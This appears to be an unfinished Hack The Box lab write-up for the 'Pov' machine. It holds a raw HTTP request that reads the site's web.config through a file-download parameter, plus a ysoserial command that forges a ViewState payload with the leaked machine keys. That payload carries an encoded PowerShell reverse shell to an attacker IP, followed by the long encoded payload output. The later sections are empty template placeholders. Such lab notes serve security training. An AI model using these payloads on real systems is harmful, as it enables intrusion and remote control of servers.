MhpHlVG3TO/bIwZL0qFIoCxw547VVp4CJ0XmJtabkAJPo+4G0DJUjWfKFwct/hU9wAfAdaDbG5f6M3+/8/Eh8xm2juMwVG+MnfvtKTHSLRElb7Ea+9OOE27HYlH8j7YXfCWCHHZOTx4azrvXTgcyeNx5APIXuN6NXSDWbfuxiRtppzAE08nVzH1RlvpewE+Us8YALjzAbSrH8BNhroLkb1VSS1WyQ5MF53lJFB85uZa5BpG48qWSeYNeSEnGSeQdYymLQdX5DTYxWl+oEwHwRcBGDLBd4kan5SgM4rkXEnTTNcUVoFFrXHQ9+8Rt5F5vUpEgfwkNvHFyRFfZMGZUJI0/AfzVqnhzGYuOWtDDfF5aUjD1sQ8tqcP4uDcThDL2pJs2+Zx1Q5HpepAu+gB4jTC5XGKqhC6+0kJzAx+5zTQGlS2kIZTDB5N/uu8vtCXkTe4aa9FRSzR2mbhOvSo74cCZm3HA75hzybPN6s/Qyb4VWW1I/Rk0S9HFz1HP2TYoHr/Lul2Jofy1CJNx+CUHJRr55nzocsG1RgI6mhk1aNyHHaw3++otN6KMTq9qsu0XoQaSaBhjOHgsnnZ1wuMwSVqRViXy+DODSf6wvLpUQzudRYUsbhv9kzA7ML2XUJgrVA08xeyjl8Uyy5n61gniRgio/HGUzJW3n6UCZoQFpjEP/wUfoTgRFcg/0ia1ruv4b+YuTkHWxCWJogjNUgjdsvbafFFUpxXMDa4ThQTfjPYBQXD+UDuYCXWaYq9KwQ7qXj7JpZuZKu2mfUj0zY09bDUXwgijpbO4GZrQ/MDLPD+RPSqgAHh66TewZ+jUKfwuBKMKfMyVRmFyB3J1Im7zjZL6dFxIFJd4Z2PUlkj7BZAUW5k87NRs5+92qLvXPxxpiAAd+8IrLuiYPu6aYLTexd7ep6P/2FV17E5ASVuR/JSQ/aDKDgjhuIMjbJHZ1C9Wuuj/dVfdSUQj/3nC7L3XlNoJYHbqw9EK/cnwDIbvt1lwkcRoLgUs1nmwou9hprw4iL0+gt9buMyUHaZMj8UkOF8jKwepgATQhE+IW2okwKmL/2+JOqdy8j2KQKaxpUswSSrvo9NM54W4GG05rcnhweCtFmqcdA7p+RZBA/jrQXGFGdqLOKG7JjuCc1OYcbfv+5JQ96GyakEaIDlDnr1TqUNrlQIloNfGmj83o+531DOhebLLnkj4bMQvFUphVPabQAhShDttFS8svUhLVmfniBzc1RKN8xAKZAD8GY62AQRbXjt20nrz/0Pfd6zPYKFitOiUXktUvGQY0JBzwB8Y52bXiS16uu+HlCOgHLkIDZsLXksdXfKxmWtsJ16mWv8/kgF7zqA6v/EREzkzHU4p2YqKAdq9zYqgTnZATOGQx+Ixc4x6DBajSd+kDhgkWheDIv1gzltTIvmCI3Gua+aK/S1sWvssvEfP4LKBZ0mDL3ceuEDptCn8vQVpbSz0DRkCvqAhhpQLoAowj7J61ncgOIIZSRc7Sn7Y4ktOheR89HmDTWcy5O4DBJtBSxDK+QQ7sQUhTSHVA6z8eFQ0LtCbJxxFcbhvsv9qA/fx0SZw5u1ox2ig5vb7uzqlO4AhgRCFwnWqEoYB0yG3yAkwkWFFYe+FapfKg==
                                                                                                                                                          
```

```
POST /portfolio/ HTTP/1.1
Host: dev.pov.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 5158
Origin: http://dev.pov.htb
Connection: keep-alive
Referer: http://dev.pov.htb/portfolio/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

__EVENTTARGET=download&__EVENTARGUMENT=&__VIEWSTATE=<b64>
&__VIEWSTATEGENERATOR=8E0F0FA3&__EVENTVALIDATION=g3XgTEszQwVlN8GaxxtPpOe6qEy6kHg5bAymbuHlcw8lPFNrZ7jptCOf2ec6ZUw0AJYf7KAAJzkabDjaid4JkIse1l1Aof5fm2K1XPlUeWeDarW2v4Nje9%2B%2F99xJq8ac5J3tIg%3D%3D&file=C:\inetpub\wwwroot\dev\web.config
```


tentativo bho:

```
WINEARCH=win32 WINEPREFIX=~/.wine32 wine ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4AOAAwACIALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==" --path="/portfolio" --apppath="/" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43"
0050:err:vulkan:vulkan_init_once Failed to load libvulkan.so.1
%2B%2FOF0SHUNSGCtBQUsU6cU8GZgI0c4LUr%2BMt7EYqED%2Fj7vUwr%2B9ruco%2FvwJbc9IoHWgi8VispbKYmahZb4%2FW1Sb5F8wJon44UvR54ouSMLb9U%2FKCwW%2BLsjx7WLbYRHETxgrf3N2NdV%2By2colL6lsR7%2BruPSQXdh2Ou%2B58Xuevck4c4f5hdS%2FpJJqFTspFpxeEl3tikpsayD1a%2Bl%2
B99jFSod0INk7DFCfowRrZcXLfDZEW1x%2Fm2EpqJhxLYxssM6%2BGF2pgP7SknFOsr6N%2BXZDWYHfa7akeeo9vOG7ZIyuZQ4gaOJ3Es93yNsvhpxcNw2xX4YXP69rX7DMz9d32EzelKpb%2Fz8JtQb2TLQoyxknw66nfPemWg4QlzuopS5lCn23UoavLb6IPxrkA6MSL4QOAiWRHyfLD4hGdAaUS8iKSOKiEkdj6Pe
zqAm6rEWmCWxbvpXBAchbadhE9OhhTfIny5U3w7v2GZOqJRlx7XL5zP40tTz9ysjCNSEihjRa3fa3XA85VG87Fga7hOFWRtdfi3ZQ9GhKWU4joNsZJXLrfC3aIXukye4dG5m1O0PFWunjxm8hpFRxF8JH2FVvLAdK%2FwVkcfatT2Y2IOSyNPohKfmp6G4xoxTSXZVaR4LCNuwuo%2FJXoS%2FZygKQHbf0ywRmQCUul
7H3bDBAsIk6CFoPKmrN5UCPhMJVfNSvJ8pNBl27kr4ICihktwg6snISXA1gJMTX4wwa4ylLqnJLRuN9KfpJ5zIpGpQGVvLLGxTPy7JzbKbpazu4tmtUnDuu1S7sCvINkFc9CJMx9TT%2F9j8R53yUwVce35%2F%2BZypEsOMhD9eWyCwOtPjNGRShObu7c5V%2FdPCeY72mbq7T0b0mojZ29Ot3U3cJmNAjBOVUlRgC4
UzZoLk%2F3Uwi4nYF%2Br9ffAYW8Nm8qqNg4bZad4eUpU3YkWZ9kYuT%2BMhWlqbulcwWOhLatK94cJX%2BfHblmUiHusRto7osEn1L7kMDonGE0FAz6pwnzzxLSm1QK0pO87Addxv2Rcpb5RxDk9iJU52Bs2r8%2FUoU4LqyELSIs6YHcigDcQNnk5giuyFknOpE9T%2FMgXqWjxsSpyG74LpgoeE7mgRLgO2Ii8Ilk
Mtif1sJy%2FqTvaiwvP0ffUYHVASaUJbSvEaF7c40I7aIMpgJ84DbCPrsLF6gTQzgUrziZxtHPCC7KKuwBlVTPNKhAXM4ppx1Y1u0qU2Eq34PKzR96uZmkfuf%2BYBB4vq5GoElRO56OJzHUT%2BnwGfe0BIodBH3OYHw2nCpZ9%2FibUqqkMszAFp4iL8vNg4A9PTfHlpuTvz4hQy30vJB5uBe6I%2BkHzMZh7Fvk69
EeMBmKmlaMXw1swaMAISxv0NPllcMqi%2BxpWCX1IfjI7T6qDLC4Keuz2GXjoGu5kX%2BiFXmgJDuet1GqMJAecSZgZbtIk0mUfwDB4xx2nz9WLLMgZwNGWTRu2d%2B57s5ETNOvZRwhfaP5wJ8qP7Pat5%2Bc8jiGteRck2TtLhnpoCbK8jTAbTfPdg8Kq3ZiAc1B5kqSGy6RyHiGvvaJQm0M5ZknM8TcvRS%2FuCil
7ki%2B8bVHKmkwQ009v2jU5axeaxbwilWfd3BMh%2B%2B9ss0f%2B%2B0C%2FpvLmYhLvnVQ6Ots2rAwYzHbyolBMGzOS7Gz2HkX1AXbDSKSbJlu0u5CGS2u7o7wlLFkVpWkClfhwzK%2B%2BPZ6OwGpl8WtNALGWzcvaFXaOmVP%2B2zT7gX1hZ2xl5dDR4HEquptUlvFm4Tr3KCaewwCNrGCwfouSNP8sLaYi6MYvK
2Vu2eUiCan2P83Tnxs3m97HF03pp6fL7CaNFFfGTDjcnbOEthE0GXm2KJ1DW2nfe0t%2FXnYWcIt3H6zCc08DWYWIS7MoSLOVBmskNkPTIfBPlIVfIfBC1MQramhGPWxfftOOv7OAAKen5r0OtIAbejmM09NnmafJWPTl8W69tMK3sn1VjkWbMeiNX5mM06WVCyPos7asSOKo481QRMHZ5JK5YNaiqYgKkNHVzD2zcdd
Rup%2B1%2BBlHj%2F56P%2BpSbQT%2BQbTr4Z%2F2T8waP5fK6OM57zQM5pkZeajbLspeRDtCl%2B09xvZ8SxEWLjVA3faYowYhH1f7KgRRdPvXk%2FZiME%2Br2JkaV9WMJhAzx6v8Bt69zvrMOxHrEk0spkd6k2aMxg7BcU%2FqBRhFNOgSeCB34DVZgEX4G9Zk7NhI4cK8GiJYXTZJSNOJK4jAtNGUoFWO2Ol814m
bkBCF%2FDleHUpTvQE%2F24SiVYJWhhDnOk5xsmDl1IzvMid69lLFAIa6999WtysM9EIqyRciDwMEo8RbH2CYE9ft0o1zLht7UXDJ2OqmfqmlCWc1c8wbjHo7GMAiwu0c7O4CdgIlYXElFfMExHS5ojbhkzExRl0e8w3tfL8SAjF%2BvIqLor0d8xuaXAlk1gVuBEoMH3Oqo8QngpA3smdFxMa2hjBvP0g2CIiYx%2Fd
An1Igcyr6g9MuevxjzSARM1XqgDso5NBTy9Q2T7fB4gstdPME6ABD7GBh%2BbjSj5W3KPkO%2BTLuITDZOg%2FLtGaKeRyIquQF7qwghcQtqgIwMI05ohmRjISNZjKpspbdS3Pknh0LWMEw2V%2BLs0IAFtdSaQWqCIdMOYlKBZIb2oUdIGg%2BfU1viVLLEByEZrbl1%2Bz361y9eyM5PfI1VwDvuCsi3hnGKZDckW9
q75i7u1vXBgUxwO8KCJ%2B8cF%2F2dltKOsxRK3GnpyBvVZUAV3JBXINkI%2BNc0XM4nTJD%2FD91B%2B7iyrnjJOSmTn5FoQUzJSP1MGhSXcojzQp5YZdf6pHs9sZJWjsqDmQVa4kIdJ1cCnuy8PFhfy0ZN16IaHm18E6kwHqjt9fXmkCkDyQItfYZwGkDGI5NH%2FCz1xSFE%2B7GGBBsml8foUdcTFAEhiZSDMRG5
datsWMTmW%2FiOY6QUHMJOeq0J3%2FhzHDhGoghryCi8c%2Fpm248%2Fphd0kTYWl8M0hf0XEUI2bVOwUaYFAyMywdPZCj%2BYCp44Oi%2FKTtggPeBDmcKvugyt5VP%2BvOvVXoPWrPJDVZMnHrhvmUbgzknaknfkNMPrJASp89XX2jCPWY33nZBzoiN1XuQ2J%2FwL6%2Bd1aJKXkmaQ9Lj9dfZ0DsNS0PVWO1Awtq
bUqbQnN%2BfQT53OBycbebANLhMYjhVwgR4lQyWeZjXahUxLa8Z8PpVgRwsNHT2nT5Y397IvIJLELvMgeWj5ajoisqdy%2FNmbdMmXU5iU%2F0HHcrXBK4SlEDuWrdjidFfmnNc6p25rDSxRJOtkYoFqAKTbR45D2vL%2FVzPe3xH0b%2BLlK1LpgC%2ByYe0zPuWX6xStrmDk9Var66oJi9MK4uRwq9cib1eS7M3kNo
cC7jSyLtv1Ej%2B5PT8K8vs9TTrIxH4Dgapfzx80zy3F2Mc%2FvyU17tmiesl%2BTaGMIJGvtJMDyVJePKdY9rEgKwKfgRXw7mFhTiaXChA0OSvI3ESfc3JR3AQtCQIzTB091SU56KX%2F%2BOjG4Us1IXdp%2Be5%2Bu7mgK4WkZqUcRw%2FtSAMgDuQQ%2Bb6Aid3YLhAmsQ4oFwLpvjXEWhU3ILxI68xuY%2BTd26
wl6RdvdGNZrRTDX337GVqCSLcXUFgP4fA0lGbLJnkm%2BrYTrwRWpx%2F3FLRIXViiEdEXk8UztKTrJoOsmwslc5LXOVAzTmVg%2Ff%2F2PPJtRpQfPvPv%2B7uXUDKFCK4Lj9UQP%2BMA3CkDMHza9m6%2B52GRpkzscGeccPci%2B8dpNxLmzf5G27DhCe3soIvXeDxAztIcU3jzuJoHzse8FDhK1wYGgud7J0cPYm
Vt4Gw5UjPiEEXXzuYzx6N33VRnYOt7Ms6V7KozrXYvqrBKiXqZFGAoYHOWI3UE77%2FXn2psEXgO6wJu7V9DFFtgRbZztTHRKG7f7IxZhDus1Li%2B7%2BZ3dnuQ9iSA%2FgRPuBRLkSdD21%2B7XDWVaRLW2YHGO%2F%2FguR%2FcQAJmqnpdDqhiRW2iNiUkQoz3CinmUV5Eq9YjqZ2zWqKN33eSktDe6sOgIv6eJS
telDq8k1Lm8pvmPyqOMD1r%2Bh0TWg4FLfQrmfoM0PkDu8oWhTL9hkerlUNNSG46UFBvwRTvJz%2BMu8IH8L6pVVkauMzOh%2Bs5JsT%2FzOc2tbtMmXTP7OOVu0Otkqumbk10L4ftYvYfysAlEYPDcomoCjEmp8r2RBBo74WjPassMmd9eaw0JUoqih9%2FGteQueiO1YsFeMYy7vmXaWvpVP2d7voW2JKvlxTJD0NF
%2B9a%2BtKx8xrmOZoJNx7itJ5OGHnGQh%2FaZj9sF6GCJX0Xm66R1pWSxbWVlFaPHNdtAlgXvwjC1gmJtO7PQ3yF7unekN8Ff92XypZ5LiN6HSatGWfztULDs1o8VeGu0pJ7V84GF6PyhCUfz4Tmy9Fb97164n7P0DSpbjrHxtRPfEW3ecqbmCesg2jlWLCvKsXDtq1FqR6BrIBpPW4X%2FfYlIQCd%2BxGCMp90pHy
JEjVMqE1j8tS3TaRfuNeh%2BF1v5B5XOVVPXCdwS%2FPZ8z5jlvqnK%2BpvcRXBp8k61Qufg0gFCDFuFDe60bi3PdOIbdgK6pPWDX93dKKFW1%2B15HxzeqT5b78W6KESbNhLd%2FeFt0mbFKZvHtJ9vql%2FuSqf8KyVn0YXHPYaM4xAETI44Z7p2uoMJly6HWPawmGW%2BVxESBqfjlo7VHtuyukyao116Rx0XpizH
ARfkS5WQo8fFdlQ9TtGQylabUkJPS7R9jW7aM92m6ImjfF5FiepBtTk4LnBHZlP%2F1S6zgqBEFLJJFlSdbEJmlPaLoi29m6%2FKENaeTZ4mrJvlBu2Y7dluMZfY68Y7LLPhSO6FXYxI0frcSe7mH7TXu1dNrhWaJyvwXmeyC7    
```

---
## User Flag

### Lateral Movement (if applicable)

Steps to move from initial foothold to user access.

---
## Privilege Escalation

### Enumeration

What you found that leads to root/admin.

### Exploitation

Step-by-step privilege escalation.

```shell
# Commands used
```

---
## Remediation

- Key takeaway 1
- Key takeaway 2
- Key takeaway 3

---
## References

- [Reference 1](https://github.com/momenbasel/htb-writeups/blob/main/templates/url)
- [Reference 2](https://github.com/momenbasel/htb-writeups/blob/main/templates/url)